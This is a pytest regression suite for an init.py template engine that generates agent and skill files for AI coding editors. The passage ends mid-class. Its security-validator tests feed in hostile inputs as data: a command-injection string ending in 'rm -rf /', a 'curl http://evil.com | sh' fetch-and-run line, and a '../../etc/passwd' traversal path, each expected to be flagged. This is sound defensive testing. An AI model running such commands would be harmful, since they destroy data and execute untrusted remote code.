"""
init.py Regression Tests

Tests for the init.py template resolution engine:
- Security validation (commands, paths, secrets, editor targets)
- Config flattening
- Token substitution
- Frontmatter parsing
- Agent generation (hybrid: generated frontmatter + hand-crafted body)
- Skill invocability suppression
- End-to-end config resolution

Run with: pytest tests/test_init.py -v
"""

import pytest
import tempfile
import shutil
from pathlib import Path

import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from init import (
    SecurityValidator,
    VALID_EDITOR_TARGETS,
    flatten,
    substitute,
    find_unresolved_tokens,
    find_unresolved_real_tokens,
    strip_escapes,
    parse_frontmatter,
    extract_agent_body,
    generate_agent_md,
    generate_agents,
    suppress_skill_invocability,
    transform_frontmatter_for_target,
    emit_cursor_mdc,
    deploy_resolved,
    emit_codex_agents_md,
    CODEX_BLOCK_BEGIN,
    CODEX_BLOCK_END,
    main,
)


# =============================================================================
# Fixtures
# =============================================================================

@pytest.fixture
def temp_dir():
    tmpdir = tempfile.mkdtemp()
    yield Path(tmpdir)
    shutil.rmtree(tmpdir)


@pytest.fixture
def sample_skill_md():
    return """---
name: architect
description: Designs technical approaches and writes ADRs.
when_to_use: "write an ADR, design this"
user-invocable: true
agent:
  tools: [read, search]
  agents: []
  model: null
  handoffs: [planner]
---

# Architect

You are the technical advisor for {{project.name}}.

## Core Constraints

- **Never implement code**
- **Never write sprint plans**

## Documents You Own

- `docs/architecture/DECISIONS.md`

## Session Start

1. Check handoffs
2. Read memory files
"""


@pytest.fixture
def sample_body_md():
    return """# Architect

You are the technical advisor for {{project.name}}.

## Core Constraints

- **Never implement code**
- **Never write sprint plans**

For detailed workflow procedures, see `skills/architect/SKILL.md`.
"""


@pytest.fixture
def resolved_tree(temp_dir, sample_skill_md):
    """Build a minimal resolved/ tree with one skill."""
    output = temp_dir / "resolved"
    skill_dir = output / "skills" / "architect"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text(sample_skill_md, encoding="utf-8")
    return output


@pytest.fixture
def resolved_tree_multi(temp_dir):
    """Build resolved/ tree with multiple skills for full regression."""
    output = temp_dir / "resolved"

    skills = {
        "architect": {
            "fm": 'name: architect\ndescription: "Designs ADRs"\nwhen_to_use: "write an ADR"\nuser-invocable: true\nagent:\n  tools: [read, search]\n  agents: []\n  model: null\n  handoffs: [planner]',
            "body": "# Architect\n\nYou design things.\n\n## Core Constraints\n\n- Never implement code\n",
        },
        "qa": {
            "fm": 'name: qa\ndescription: "Runs quality pipeline"\nwhen_to_use: "run tests"\nuser-invocable: true\nagent:\n  tools: [read, search, execute, edit]\n  agents: []\n  model: null\n  handoffs: []',
            "body": "# QA\n\nYou run tests.\n\n## Constraints\n\n- Report only\n",
        },
        "noskill": {
            "fm": 'name: noskill\ndescription: "No agent block"',
            "body": "# No Skill\n\nNo agent metadata.\n",
        },
    }

    for name, data in skills.items():
        skill_dir = output / "skills" / name
        skill_dir.mkdir(parents=True)
        content = f"---\n{data['fm']}\n---\n\n{data['body']}"
        (skill_dir / "SKILL.md").write_text(content, encoding="utf-8")

    return output


# =============================================================================
# Security Validation Tests
# =============================================================================

class TestSecurityValidator:

    def test_valid_command(self):
        errors = SecurityValidator.validate_command("npm install", "commands.install")
        assert len(errors) == 0

    def test_unknown_command_warns(self):
        errors = SecurityValidator.validate_command("evil-binary --flag", "commands.custom")
        assert len(errors) == 1
        assert "WARNING" in errors[0]

    def test_dangerous_command_injection(self):
        errors = SecurityValidator.validate_command("npm install; rm -rf /", "commands.install")
        assert any("CRITICAL" in e for e in errors)

    def test_curl_pipe_to_shell(self):
        errors = SecurityValidator.validate_command("curl http://evil.com | sh", "commands.setup")
        assert any("CRITICAL" in e for e in errors)

    def test_path_traversal(self):
        errors = SecurityValidator.validate_path("../../etc/passwd", "paths.config")
        assert any("CRITICAL" in e for e in errors)

    def test_relative_path_ok(self):
        errors = SecurityValidator.validate_path("docs/planning/ROADMAP.md", "paths.roadmap")
        assert len(errors) == 0

    def test_detect_secrets(self):
        text = 'api_key: "sk-1234567890abcdefghijklmnopqrstuvwxyz"'
        secrets = SecurityValidator.detect_secrets(text)
        assert len(secrets) > 0

    def test_no_secrets_in_clean_config(self):
        text = 'project:\n  name: "My App"\n  language: "TypeScript"'
        secrets = SecurityValidator.detect_secrets(text)
        assert len(secrets) == 0


class TestEditorTargetValidation:

    def test_valid_targets(self):
        for target in ('vscode', 'claude-code', 'cursor', 'codex', 'both', 'all'):
            assert target in VALID_EDITOR_TARGETS

    def test_invalid_target_rejected(self):
        config = {"editor": {"target": "sublime"}}
        errors, _ = SecurityValidator.validate_config(config)
        assert any("editor.target" in e for e in errors)

    def test_valid_target_accepted(self):
        config = {"editor": {"target": "vscode"}}
        errors, _ = SecurityValidator.validate_config(config)
        assert not any("editor.target" in e for e in errors)

    def test_missing_editor_defaults_to_both(self):
        config = {"project": {"name": "Test"}}
        errors, _ = SecurityValidator.validate_config(config)
        # Should not error — defaults to "both"
        assert not any("editor.target" in e for e in errors)


# =============================================================================
# Flatten & Substitute Tests
# =============================================================================

class TestFlatten:

    def test_flat_dict(self):
        result = flatten({"a": "1", "b": "2"})
        assert result == {"a": "1", "b": "2"}

    def test_nested_dict(self):
        result = flatten({"paths": {"ledger": "docs/LEDGER.md"}})
        assert result == {"paths.ledger": "docs/LEDGER.md"}

    def test_deep_nesting(self):
        result = flatten({"a": {"b": {"c": "deep"}}})
        assert result == {"a.b.c": "deep"}

    def test_none_becomes_empty_string(self):
        result = flatten({"a": None})
        assert result == {"a": ""}

    def test_numeric_values_become_strings(self):
        result = flatten({"quality": {"threshold": 80}})
        assert result == {"quality.threshold": "80"}


class TestSubstitute:

    def test_basic_substitution(self):
        result = substitute("Hello {{project.name}}", {"project.name": "MyApp"})
        assert result == "Hello MyApp"

    def test_multiple_tokens(self):
        tokens = {"a": "1", "b": "2"}
        result = substitute("{{a}} and {{b}}", tokens)
        assert result == "1 and 2"

    def test_unresolved_token_left_in_place(self):
        result = substitute("Hello {{unknown.token}}", {})
        assert "{{unknown.token}}" in result

    def test_whitespace_in_token_name(self):
        result = substitute("Hello {{ project.name }}", {"project.name": "App"})
        assert result == "Hello App"

    def test_no_tokens(self):
        result = substitute("No tokens here", {"a": "1"})
        assert result == "No tokens here"


class TestTokenDetectorFalsePositives:
    """Token-shaped strings and the inline-code-span resolution policy.

    Coverage for the init.py detector exemptions and the Option 2a policy:
      - GitHub Actions '${{ secrets.* }}' has a leading '$' and is ignored.
      - Tokens inside backticked inline code spans now RESOLVE (and unknown
        ones are flagged) like tokens in prose.
      - Escaped literals '\\{{...}}' are preserved verbatim by substitute()
        (marker intact) and skipped by find_unresolved_tokens(); the backslash
        is removed only by the final strip_escapes() pass.
    """

    def test_github_actions_secrets_not_substituted(self):
        src = "Use ${{ secrets.GITHUB_TOKEN }} in your workflow."
        result = substitute(src, {"secrets.GITHUB_TOKEN": "hijacked"})
        assert result == src

    def test_github_actions_secrets_not_flagged(self):
        src = "Use ${{ secrets.GITHUB_TOKEN }} in your workflow."
        assert find_unresolved_tokens(src) == []

    def test_backticked_known_token_resolves(self):
        src = "Check for unresolved `{{tokens}}` in output."
        result = substitute(src, {"tokens": "REPLACED"})
        assert result == "Check for unresolved `REPLACED` in output."

    def test_backticked_unknown_token_flagged(self):
        src = "Check for unresolved `{{tokens}}` in output."
        assert find_unresolved_tokens(src) == ["{{tokens}}"]

    def test_escaped_token_preserved_by_substitute(self):
        # The marker (with backslash) survives substitution untouched.
        src = "Check for unresolved `\\{{tokens}}` in output."
        result = substitute(src, {"tokens": "REPLACED"})
        assert result == "Check for unresolved `\\{{tokens}}` in output."

    def test_escaped_token_not_flagged(self):
        src = "Check for unresolved `\\{{tokens}}` in output."
        assert find_unresolved_tokens(src) == []

    def test_strip_escapes_produces_clean_literal(self):
        # The final pass removes the backslash, leaving a clean literal.
        src = "Check for unresolved `\\{{tokens}}` in output."
        assert strip_escapes(src) == "Check for unresolved `{{tokens}}` in output."

    def test_bare_unknown_token_still_flagged(self):
        src = "Path is {{paths.missing}}"
        assert find_unresolved_tokens(src) == ["{{paths.missing}}"]

    def test_known_token_resolves_inside_and_outside_backticks(self):
        src = "Hello {{project.name}}; doc reference: `{{project.name}}`."
        result = substitute(src, {"project.name": "MyApp"})
        assert result == "Hello MyApp; doc reference: `MyApp`."
        assert find_unresolved_tokens(result) == []

    def test_escape_end_to_end(self):
        # Real reference resolves; escaped literal is preserved through the
        # scan, then cleaned by strip_escapes() for the deployed file.
        src = "ref `{{paths.x}}` vs literal `\\{{paths.x}}`."
        resolved = substitute(src, {"paths.x": "docs/x.md"})
        assert resolved == "ref `docs/x.md` vs literal `\\{{paths.x}}`."
        assert find_unresolved_tokens(resolved) == []
        assert strip_escapes(resolved) == "ref `docs/x.md` vs literal `{{paths.x}}`."

    def test_strip_must_run_after_scan(self):
        # Locks the main() pipeline ordering: the unresolved-token scan must
        # run BEFORE strip_escapes(). If strip ran first, the backslash would
        # be gone and the now-bare {{token}} would be flagged as unresolved.
        resolved = substitute("literal `\\{{tokens}}`.", {})
        # Correct order: scan sees the marker and stays silent, strip cleans.
        assert find_unresolved_tokens(resolved) == []
        assert strip_escapes(resolved) == "literal `{{tokens}}`."
        # Inverted order (strip first) would produce a false-positive flag —
        # this is the failure the ordering guards against.
        stripped_first = strip_escapes(resolved)
        assert find_unresolved_tokens(stripped_first) == ["{{tokens}}"]
        # The deployed-tree detector is the post-strip counterpart: a no-dot
        # literal is documentation, not a leak, even with the backslash gone.
        assert find_unresolved_real_tokens(stripped_first) == []


class TestFindUnresolvedRealTokens:
    """Deployed-tree detector: post-strip files where escapes are already
    gone. Only dotted {{namespace.key}} forms are real config-token leaks;
    no-dot brace literals are documentation. Semantics must match
    scripts/check_tokens.py's _TOKEN_RE."""

    def test_no_dot_literal_not_flagged(self):
        # A stripped documentation literal in a deployed file is clean output.
        assert find_unresolved_real_tokens("Check for `{{tokens}}` in output.") == []

    def test_dotted_leak_flagged(self):
        assert find_unresolved_real_tokens(
            "Dir: {{paths.claude_commands}}"
        ) == ["{{paths.claude_commands}}"]

    def test_escaped_dotted_literal_not_flagged(self):
        # Defensive: should a backslash ever survive into a scanned file,
        # it still marks an intentional literal (same as check_tokens.py).
        assert find_unresolved_real_tokens("Use `\\{{paths.x}}` syntax.") == []

    def test_github_actions_syntax_not_flagged(self):
        assert find_unresolved_real_tokens(
            "Use ${{ secrets.GITHUB_TOKEN }} in your workflow."
        ) == []

    def test_matches_check_tokens_regex(self):
        """The init.py detector and the CI guardrail must use the exact same
        token pattern — drift here recreates the deploy/CI disagreement."""
        from init import _REAL_TOKEN_RE
        assert _check_tokens._TOKEN_RE.pattern == _REAL_TOKEN_RE.pattern


# =============================================================================
# Frontmatter Parsing Tests
# =============================================================================

class TestParseFrontmatter:

    def test_valid_frontmatter(self):
        text = "---\nname: test\ndescription: hello\n---\n\n# Body"
        fm, body = parse_frontmatter(text)
        assert fm["name"] == "test"
        assert "# Body" in body

    def test_no_frontmatter(self):
        text = "# Just a heading\n\nSome content."
        fm, body = parse_frontmatter(text)
        assert fm == {}
        assert "# Just a heading" in body

    def test_frontmatter_with_agent_block(self, sample_skill_md):
        fm, body = parse_frontmatter(sample_skill_md)
        assert fm["name"] == "architect"
        assert "agent" in fm
        assert fm["agent"]["tools"] == ["read", "search"]
        assert fm["agent"]["handoffs"] == ["planner"]

    def test_malformed_yaml_returns_empty(self):
        text = "---\n: invalid: yaml: [unclosed\n---\n\nBody"
        fm, body = parse_frontmatter(text)
        assert fm == {}

    def test_missing_closing_fence(self):
        text = "---\nname: test\nNo closing fence"
        fm, body = parse_frontmatter(text)
        assert fm == {}


# =============================================================================
# Agent Body Extraction Tests (fallback)
# =============================================================================

class TestExtractAgentBody:

    def test_extracts_identity_and_constraints(self, sample_skill_md):
        fm, body = parse_frontmatter(sample_skill_md)
        result = extract_agent_body("architect", fm, body)
        assert "technical advisor" in result
        assert "Never implement code" in result
        assert "Never write sprint plans" in result

    def test_drops_documents_you_own(self, sample_skill_md):
        fm, body = parse_frontmatter(sample_skill_md)
        result = extract_agent_body("architect", fm, body)
        assert "Documents You Own" not in result
        assert "DECISIONS.md" not in result

    def test_drops_session_start(self, sample_skill_md):
        fm, body = parse_frontmatter(sample_skill_md)
        result = extract_agent_body("architect", fm, body)
        assert "Session Start" not in result
        assert "Check handoffs" not in result

    def test_includes_skill_reference(self, sample_skill_md):
        fm, body = parse_frontmatter(sample_skill_md)
        result = extract_agent_body("architect", fm, body)
        assert "skills/architect/SKILL.md" in result


# =============================================================================
# Agent MD Generation Tests
# =============================================================================

class TestGenerateAgentMd:

    def test_generates_valid_frontmatter(self, sample_skill_md, sample_body_md):
        fm, _ = parse_frontmatter(sample_skill_md)
        result = generate_agent_md("architect", fm, sample_body_md.strip())
        assert result.startswith("---\n")
        assert "name: architect" in result
        assert "tools: [read, search]" in result
        assert "handoffs: [planner]" in result

    def test_description_includes_when_to_use(self, sample_skill_md, sample_body_md):
        fm, _ = parse_frontmatter(sample_skill_md)
        result = generate_agent_md("architect", fm, sample_body_md.strip())
        assert "Use when:" in result

    def test_description_truncated_at_1024(self):
        fm = {
            "description": "A" * 1000,
            "when_to_use": "B" * 100,
            "agent": {"tools": ["read"]},
        }
        result = generate_agent_md("test", fm, "Body content")
        # Extract description line
        for line in result.split('\n'):
            if line.startswith('description:'):
                desc = line.split('"')[1]
                assert len(desc) <= 1024
                assert desc.endswith("...")
                break

    def test_empty_agents_list_omitted(self, sample_skill_md, sample_body_md):
        fm, _ = parse_frontmatter(sample_skill_md)
        result = generate_agent_md("architect", fm, sample_body_md.strip())
        assert "agents:" not in result  # Empty list should be omitted

    def test_agents_list_included_when_populated(self):
        fm = {
            "description": "Orchestrator",
            "agent": {"tools": ["read"], "agents": ["qa", "perf"], "handoffs": []},
        }
        result = generate_agent_md("sprint-lead", fm, "Body")
        assert "agents: [qa, perf]" in result

    def test_body_content_included(self, sample_skill_md, sample_body_md):
        fm, _ = parse_frontmatter(sample_skill_md)
        result = generate_agent_md("architect", fm, sample_body_md.strip())
        assert "technical advisor" in result
        assert "skills/architect/SKILL.md" in result


# =============================================================================
# Hybrid Agent Generation (end-to-end)
# =============================================================================

class TestGenerateAgents:

    def test_generates_from_hand_crafted_body(self, resolved_tree, temp_dir):
        # Create a hand-crafted body file
        bodies_dir = temp_dir / "agents_src"
        bodies_dir.mkdir()
        (bodies_dir / "architect.body.md").write_text(
            "# Architect\n\nHand-crafted body for {{project.name}}.\n",
            encoding="utf-8",
        )

        # Temporarily patch the bodies_src path
        import init
        original_fn = init.generate_agents

        def patched_generate(output, tokens):
            old_path = Path("agents")
            init_module_generate = init.generate_agents.__code__
            # Just run the real function — it reads from Path("agents")
            return original_fn(output, tokens)

        tokens = {"project.name": "TestApp"}
        # We need to run from the temp_dir context so agents/ resolves
        import os
        old_cwd = os.getcwd()
        try:
            os.chdir(temp_dir)
            # Create agents/ dir at CWD
            agents_dir = temp_dir / "agents"
            agents_dir.mkdir(exist_ok=True)
            (agents_dir / "architect.body.md").write_text(
                "# Architect\n\nHand-crafted body for {{project.name}}.\n",
                encoding="utf-8",
            )
            result = generate_agents(resolved_tree, tokens)
        finally:
            os.chdir(old_cwd)

        assert "architect" in result
        agent_file = resolved_tree / "agents" / "architect.agent.md"
        assert agent_file.exists()
        content = agent_file.read_text(encoding="utf-8")
        assert "Hand-crafted body for TestApp" in content
        assert content.startswith("---\n")

    def test_falls_back_to_extraction(self, resolved_tree):
        """When no body file exists, should auto-extract from SKILL.md."""
        import os
        old_cwd = os.getcwd()
        try:
            os.chdir(resolved_tree.parent)
            # No agents/ directory — force fallback
            result = generate_agents(resolved_tree, {"project.name": "FallbackApp"})
        finally:
            os.chdir(old_cwd)

        assert "architect" in result
        agent_file = resolved_tree / "agents" / "architect.agent.md"
        content = agent_file.read_text(encoding="utf-8")
        assert "technical advisor" in content  # extracted identity
        assert "skills/architect/SKILL.md" in content

    def test_skips_skills_without_agent_metadata(self, resolved_tree_multi):
        import os
        old_cwd = os.getcwd()
        try:
            os.chdir(resolved_tree_multi.parent)
            result = generate_agents(resolved_tree_multi, {})
        finally:
            os.chdir(old_cwd)

        assert "architect" in result
        assert "qa" in result
        assert "noskill" not in result

    def test_token_substitution_applied(self, resolved_tree):
        import os
        old_cwd = os.getcwd()
        try:
            os.chdir(resolved_tree.parent)
            agents_dir = resolved_tree.parent / "agents"
            agents_dir.mkdir(exist_ok=True)
            (agents_dir / "architect.body.md").write_text(
                "# Architect\n\nAdvisor for {{project.name}}.\n",
                encoding="utf-8",
            )
            generate_agents(resolved_tree, {"project.name": "TokenTest"})
        finally:
            os.chdir(old_cwd)

        content = (resolved_tree / "agents" / "architect.agent.md").read_text(encoding="utf-8")
        assert "TokenTest" in content
        assert "{{project.name}}" not in content


# =============================================================================
# Skill Invocability Suppression Tests
# =============================================================================

class TestSuppressSkillInvocability:

    def test_suppresses_user_invocable(self, resolved_tree):
        count = suppress_skill_invocability(resolved_tree, ["architect"])
        assert count == 1

        skill_text = (resolved_tree / "skills" / "architect" / "SKILL.md").read_text(encoding="utf-8")
        assert "user-invocable: false" in skill_text
        assert "user-invocable: true" not in skill_text

    def test_skips_already_false(self, temp_dir):
        output = temp_dir / "resolved"
        skill_dir = output / "skills" / "qa"
        skill_dir.mkdir(parents=True)
        (skill_dir / "SKILL.md").write_text(
            "---\nname: qa\nuser-invocable: false\n---\n\n# QA\n",
            encoding="utf-8",
        )

        count = suppress_skill_invocability(output, ["qa"])
        assert count == 0

    def test_skips_missing_skill(self, resolved_tree):
        count = suppress_skill_invocability(resolved_tree, ["nonexistent"])
        assert count == 0

    def test_does_not_modify_source_skills(self, resolved_tree):
        """Source skills/ should never be modified — only resolved copies."""
        source_path = Path(__file__).parent.parent / "skills" / "architect" / "architect.skill.md"
        if source_path.exists():
            original = source_path.read_text(encoding="utf-8")
            suppress_skill_invocability(resolved_tree, ["architect"])
            after = source_path.read_text(encoding="utf-8")
            assert original == after


# =============================================================================
# End-to-end: Full init.py run against example config
# =============================================================================

class TestEndToEndResolution:

    def test_example_config_resolves_all_skills(self):
        """All 13 skills should resolve from example config."""
        resolved = Path(__file__).parent.parent / "resolved" / "skills"
        expected_skills = [
            "a11y", "architect", "bug", "docs", "onboarding", "perf", "planner",
            "pm", "qa", "researcher", "reviewer", "security", "sprint-lead",
        ]
        for skill_name in expected_skills:
            skill_md = resolved / skill_name / "SKILL.md"
            assert skill_md.exists(), f"Missing resolved skill: {skill_name}"

    def test_resolved_onboarding_escape_is_clean_literal(self):
        """Full-build evidence that strip_escapes() runs after the unresolved
        scan in main(): the escaped `\\{{tokens}}` literal in the onboarding
        skill source ships as a clean `{{tokens}}` literal in the deployed
        file — no surviving backslash, and it was not flagged or resolved."""
        skill_md = (
            Path(__file__).parent.parent
            / "resolved" / "skills" / "onboarding" / "SKILL.md"
        )
        assert skill_md.exists(), "resolved onboarding SKILL.md missing — rebuild"
        text = skill_md.read_text(encoding="utf-8")
        assert "`{{tokens}}`" in text, "escaped literal did not survive as clean {{tokens}}"
        assert "\\{{tokens}}" not in text, "backslash escape marker leaked into deployed file"
        # The clean literal is intentionally a bare {{tokens}} in the deployed
        # file. find_unresolved_tokens() WOULD flag it now (the backslash is
        # gone) — which is exactly why strip_escapes() must run after the scan,
        # not before. We assert it IS detectable to document that ordering.
        assert find_unresolved_tokens(text) == ["{{tokens}}"]

    def test_all_13_agents_generated(self):
        """All 13 agents should be generated."""
        agents_dir = Path(__file__).parent.parent / "resolved" / "agents"
        expected_agents = [
            "a11y", "architect", "bug", "docs", "onboarding", "perf", "planner",
            "pm", "qa", "researcher", "reviewer", "security", "sprint-lead",
        ]
        for agent_name in expected_agents:
            agent_md = agents_dir / f"{agent_name}.agent.md"
            assert agent_md.exists(), f"Missing agent: {agent_name}"

    def test_agents_have_valid_frontmatter(self):
        """Every generated agent should have parseable YAML frontmatter with required fields."""
        agents_dir = Path(__file__).parent.parent / "resolved" / "agents"
        for agent_file in sorted(agents_dir.glob("*.agent.md")):
            text = agent_file.read_text(encoding="utf-8")
            fm, body = parse_frontmatter(text)
            assert "name" in fm, f"{agent_file.name}: missing 'name'"
            assert "description" in fm, f"{agent_file.name}: missing 'description'"
            assert len(fm.get("description", "")) <= 1024, f"{agent_file.name}: description exceeds 1024 chars"

    def test_agents_reference_skill(self):
        """Every agent body should reference its skill at the adopter deploy
        path, not the non-deployed source-tree `skills/<name>/SKILL.md` path
        (BUG-005 mechanism #3)."""
        agents_dir = Path(__file__).parent.parent / "resolved" / "agents"
        for agent_file in sorted(agents_dir.glob("*.agent.md")):
            name = agent_file.stem.replace(".agent", "")
            text = agent_file.read_text(encoding="utf-8")
            assert f"{name}/SKILL.md" in text, f"{agent_file.name}: missing skill reference"
            assert f"skills/{name}/SKILL.md" not in text, (
                f"{agent_file.name}: references non-deployed source path "
                f"skills/{name}/SKILL.md — use the deploy-dir token instead"
            )

    def test_sprint_lead_has_security_in_agents(self):
        """Sprint-lead agent should delegate to security."""
        agent_file = Path(__file__).parent.parent / "resolved" / "agents" / "sprint-lead.agent.md"
        text = agent_file.read_text(encoding="utf-8")
        fm, _ = parse_frontmatter(text)
        agents_list = fm.get("agents", [])  # May be string in YAML
        # Handle both list format and comma-separated string
        if isinstance(agents_list, str):
            assert "security" in agents_list
        else:
            assert "security" in agents_list, f"sprint-lead agents: {agents_list}"

    def test_no_unresolved_tokens_except_known(self):
        """Resolved agents should have no unresolved {{tokens}}.

        Uses the production detector so documentation literals (backticked
        token references, GitHub-Actions ${{ secrets.* }}) are correctly
        exempted without a hard-coded allowlist.
        """
        agents_dir = Path(__file__).parent.parent / "resolved" / "agents"
        for agent_file in sorted(agents_dir.glob("*.agent.md")):
            text = agent_file.read_text(encoding="utf-8")
            unresolved = find_unresolved_tokens(text)
            assert not unresolved, f"{agent_file.name}: unresolved tokens: {unresolved}"

    def test_body_files_exist_for_all_skills(self):
        """Every skill with agent: metadata should have a hand-crafted body file."""
        agents_src = Path(__file__).parent.parent / "agents"
        skills_dir = Path(__file__).parent.parent / "skills"

        for skill_dir in sorted(skills_dir.iterdir()):
            # Find skill file — {name}.skill.md or SKILL.md
            skill_md = skill_dir / f"{skill_dir.name}.skill.md"
            if not skill_md.exists():
                skill_md = skill_dir / "SKILL.md"
            if not skill_md.exists():
                continue
            fm, _ = parse_frontmatter(skill_md.read_text(encoding="utf-8"))
            if "agent" not in fm:
                continue
            name = fm.get("name", skill_dir.name)
            body_file = agents_src / f"{name}.body.md"
            assert body_file.exists(), f"Missing body file: agents/{name}.body.md"

    def test_agent_bodies_under_100_lines(self):
        """Agent bodies should be under ~100 lines (context budget)."""
        agents_dir = Path(__file__).parent.parent / "resolved" / "agents"
        for agent_file in sorted(agents_dir.glob("*.agent.md")):
            text = agent_file.read_text(encoding="utf-8")
            _, body = parse_frontmatter(text)
            line_count = len(body.strip().split('\n'))
            assert line_count <= 120, f"{agent_file.name}: body is {line_count} lines (max ~100)"


# =============================================================================
# Companion file resolution — non-skill *.md siblings deployed to resolved/
# =============================================================================

class TestCompanionFileResolution:
    """Companion *.md files (e.g. phase-details.md, subagent-templates.md) in a
    skill directory should be resolved and deployed alongside SKILL.md."""

    def test_sprint_lead_companions_deployed(self):
        """sprint-lead companion files should appear in resolved output."""
        resolved = Path(__file__).parent.parent / "resolved" / "skills" / "sprint-lead"
        for companion in ("phase-details.md", "subagent-templates.md"):
            assert (resolved / companion).exists(), f"Missing companion: {companion}"

    def test_onboarding_companions_deployed(self):
        """onboarding companion files should appear in resolved output."""
        resolved = Path(__file__).parent.parent / "resolved" / "skills" / "onboarding"
        assert (resolved / "CLAUDE_CODE_SETUP.md").exists(), (
            "Missing companion: CLAUDE_CODE_SETUP.md"
        )

    def test_companion_tokens_resolved(self):
        """phase-details.md ships through substitute() with no unresolved tokens.

        The source carries {{commands.*}} tokens inside a fenced code block
        (Phase 2.5), which substitute() resolves today. Inline code-span tokens
        (e.g. `{{paths.sprints_doc}}`) are intentionally left raw until the
        Task Group 3 (Defect B) policy flip, so they are not asserted here.
        """
        companion = (
            Path(__file__).parent.parent
            / "resolved" / "skills" / "sprint-lead" / "phase-details.md"
        )
        text = companion.read_text(encoding="utf-8")
        assert find_unresolved_tokens(text) == [], "companion has unresolved tokens"
        # Fenced-block token must be resolved (proves substitute() ran on the companion).
        assert "{{commands.typecheck}}" not in text

    def test_skill_source_not_emitted_as_companion(self):
        """The *.skill.md source must not be copied verbatim as a companion."""
        resolved = Path(__file__).parent.parent / "resolved" / "skills" / "sprint-lead"
        assert not (resolved / "sprint-lead.skill.md").exists()


# =============================================================================
# 3.1 / 3.2 — Path-scoped frontmatter + Cursor emission
# =============================================================================

class TestEditorTargetsExtended:
    """3.2: 'cursor' and 'all' must be accepted as editor targets."""

    def test_cursor_is_valid_target(self):
        assert "cursor" in VALID_EDITOR_TARGETS

    def test_all_is_valid_target(self):
        assert "all" in VALID_EDITOR_TARGETS

    def test_cursor_target_passes_validator(self):
        errors, _ = SecurityValidator.validate_config({"editor": {"target": "cursor"}})
        assert not any("editor.target" in e for e in errors)

    def test_all_target_passes_validator(self):
        errors, _ = SecurityValidator.validate_config({"editor": {"target": "all"}})
        assert not any("editor.target" in e for e in errors)

    def test_codex_is_valid_target(self):
        """Sprint 4 TG1: 'codex' is a first-class editor.target value."""
        assert "codex" in VALID_EDITOR_TARGETS

    def test_codex_target_passes_validator(self):
        errors, _ = SecurityValidator.validate_config({"editor": {"target": "codex"}})
        assert not any("editor.target" in e for e in errors)


class TestTransformFrontmatterForTarget:
    """3.1: scope: in source frontmatter rewrites to platform-native field."""

    def test_vscode_target_emits_applyTo_from_scope(self):
        out = transform_frontmatter_for_target({"scope": "docs/**"}, "vscode")
        assert out.get("applyTo") == "docs/**"

    def test_both_target_emits_applyTo_from_scope(self):
        out = transform_frontmatter_for_target({"scope": "docs/**"}, "both")
        assert out.get("applyTo") == "docs/**"

    def test_claude_code_target_emits_paths_from_scope(self):
        out = transform_frontmatter_for_target({"scope": "docs/**"}, "claude-code")
        assert out.get("paths") == ["docs/**"]

    def test_all_target_emits_both_applyTo_and_paths(self):
        out = transform_frontmatter_for_target({"scope": "docs/**"}, "all")
        assert out.get("applyTo") == "docs/**"
        assert out.get("paths") == ["docs/**"]

    def test_scope_as_list_serializes_to_comma_for_vscode(self):
        out = transform_frontmatter_for_target(
            {"scope": ["docs/**", "src/**"]}, "vscode"
        )
        assert out.get("applyTo") == "docs/**, src/**"

    def test_scope_as_list_preserves_list_for_claude_code(self):
        out = transform_frontmatter_for_target(
            {"scope": ["docs/**", "src/**"]}, "claude-code"
        )
        assert out.get("paths") == ["docs/**", "src/**"]

    def test_no_scope_preserves_existing_applyTo(self):
        out = transform_frontmatter_for_target(
            {"applyTo": "docs/legacy.md"}, "vscode"
        )
        assert out.get("applyTo") == "docs/legacy.md"

    def test_other_fields_preserved(self):
        out = transform_frontmatter_for_target(
            {"scope": "docs/**", "title": "X", "extra": [1, 2]}, "vscode"
        )
        assert out.get("title") == "X"
        assert out.get("extra") == [1, 2]

    def test_codex_target_is_a_noop(self):
        """Sprint 4 TG1: AGENTS.md has no scoping frontmatter — codex leaves
        the frontmatter untouched (no applyTo/paths rewrite)."""
        fm = {"scope": "docs/**", "description": "d"}
        out = transform_frontmatter_for_target(fm, "codex")
        assert out == fm
        assert "applyTo" not in out
        assert "paths" not in out


class TestEmitCursorMdc:
    """3.2: emit_cursor_mdc writes .cursor/rules/*.mdc with proper frontmatter."""

    def test_emits_mdc_file_for_instruction(self, tmp_path):
        body = "# Rule\n\nDo the thing.\n"
        fm = {"scope": "src/**", "description": "Do the thing"}
        out_dir = tmp_path / ".cursor" / "rules"
        emit_cursor_mdc("do-thing", fm, body, out_dir)

        target = out_dir / "do-thing.mdc"
        assert target.exists()
        text = target.read_text(encoding="utf-8")
        assert text.startswith("---")
        assert "globs:" in text
        assert "src/**" in text
        assert "alwaysApply:" in text
        assert "description:" in text
        assert "# Rule" in text

    def test_alwaysApply_true_when_no_scope(self, tmp_path):
        out_dir = tmp_path / ".cursor" / "rules"
        emit_cursor_mdc("always", {"description": "always on"}, "# always\n", out_dir)

        text = (out_dir / "always.mdc").read_text(encoding="utf-8")
        assert "alwaysApply: true" in text

    def test_list_scope_joined_with_comma(self, tmp_path):
        out_dir = tmp_path / ".cursor" / "rules"
        emit_cursor_mdc(
            "multi", {"scope": ["src/**", "docs/**"]}, "# multi\n", out_dir
        )
        text = (out_dir / "multi.mdc").read_text(encoding="utf-8")
        assert "src/**, docs/**" in text


class TestScopeAddedToTwoInstructions:
    """3.1 POC: at least 2 instruction files declare path-scope frontmatter.

    Post protocol-v1 (ADR-0012), the canonical field is ``applies_to``;
    ``scope`` is still accepted as a legacy alias.
    """

    def test_at_least_two_instructions_have_scope(self):
        from pathlib import Path
        root = Path(__file__).parent.parent
        candidates = list((root / "instructions").rglob("*.md"))
        with_scope = []
        for p in candidates:
            text = p.read_text(encoding="utf-8")
            fm, _ = parse_frontmatter(text)
            if isinstance(fm, dict) and ("applies_to" in fm or "scope" in fm):
                with_scope.append(p.name)
        assert len(with_scope) >= 2, (
            f"expected >=2 instructions with applies_to/scope, got {with_scope}"
        )


# =============================================================================
# Cross-reference path correctness — skill companion references resolve to the
# adopter deploy dir, never the source-tree `skills/<name>/<file>.md` path.
# =============================================================================

class TestSkillCrossReferencePaths:
    """Skill companion cross-references must point at the deploy dir, not the
    source tree. In an adopter project, companion files live at
    `.github/agents/<name>/<file>.md`, so a literal `skills/<name>/<file>.md`
    reference in resolved output would dangle.
    """

    # Source-style references derived from skill companion files at collection
    # time: all .md files inside skills/<name>/ that are NOT the primary
    # *.skill.md entry-point.  Any future companion added to a skill dir is
